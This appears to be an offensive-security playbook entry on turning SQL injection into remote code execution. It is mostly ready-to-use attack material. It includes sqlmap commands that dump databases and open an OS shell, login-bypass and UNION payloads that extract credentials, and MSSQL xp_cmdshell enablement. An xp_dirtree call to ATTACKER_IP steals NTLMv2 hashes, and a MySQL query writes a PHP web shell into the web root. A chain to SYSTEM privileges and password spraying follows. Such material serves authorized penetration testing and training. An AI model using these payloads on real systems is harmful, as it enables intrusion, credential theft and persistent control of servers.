---
id: sqli-rce
title: SQLi → RCE
stage: initial-access
tags: [web]
summary: Exploit SQL injection to read credentials, write web shells, or execute OS commands — the path from SQLi to shell depends on the database engine.
leads_to:
  - rev-shell
  - web-shell
---

## Prerequisites

A parameter that reflects database query results or exhibits error-based/time-based behavior. Capture the request in Burp first — sqlmap works best from a saved request file.

SQL injection lets you break out of a query's intended context and issue your own SQL. Beyond credential extraction, MySQL with FILE privilege can write a web shell to disk, and MSSQL with sysadmin rights can execute OS commands via `xp_cmdshell`. The database type determines your RCE path — always identify the engine first.

## Quick Win

> Save the Burp request, run sqlmap — it handles detection, extraction, and shell in one chain.

```bash
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D dbname -T users --dump
sqlmap -r request.txt --batch --os-shell
```

## Manual Detection

> Confirm injection exists before automating — a syntax error or time delay is your signal.

```
'
"
' OR 1=1-- -
' AND SLEEP(5)-- -
```

## Authentication Bypass

> Manipulate the WHERE clause to authenticate as any user without a valid password.

```
admin'--
admin'#
' OR '1'='1'--
' OR 1=1 LIMIT 1--
```

## UNION-Based Extraction

> Extract arbitrary data once you know the column count and a printable column position.

```sql
-- Find column count (increment until no error)
' ORDER BY 3--

-- Find printable column
' UNION SELECT NULL,'a',NULL--

-- Extract credentials
' UNION SELECT username,password,NULL FROM users--
```

## MSSQL → xp_cmdshell

> Enable and call xp_cmdshell for OS command execution — requires sysadmin.

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';--

-- Steal NTLMv2 hash (start Responder first)
'; EXEC xp_dirtree '\\ATTACKER_IP\share';--
```

## MySQL → Write Web Shell

> Write a PHP shell directly to disk if FILE privilege is granted and web root is known.

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

## sqlmap Options

> Full sqlmap toolkit — tamper scripts for WAF bypass, dbms flag to skip detection.

```bash
# With cookie
sqlmap -u "http://$TARGET/page.php?id=1" --cookie "PHPSESSID=abc" --batch --dbs

# Specify DB type to skip detection
sqlmap -r request.txt --dbms=mysql --batch
sqlmap -r request.txt --dbms=mssql --batch --level=5 --risk=3

# WAF bypass
sqlmap -r request.txt --tamper=space2comment --batch
```

## Leads To

MySQL FILE privilege → write PHP shell to web root → web-shell or rev-shell. MSSQL sysadmin → xp_cmdshell → `whoami /priv` → SeImpersonatePrivilege → SYSTEM via GodPotato. MSSQL NTLMv2 steal via xp_dirtree → crack or relay → pass-the-hash. Credentials from user table → password-spray across the environment.
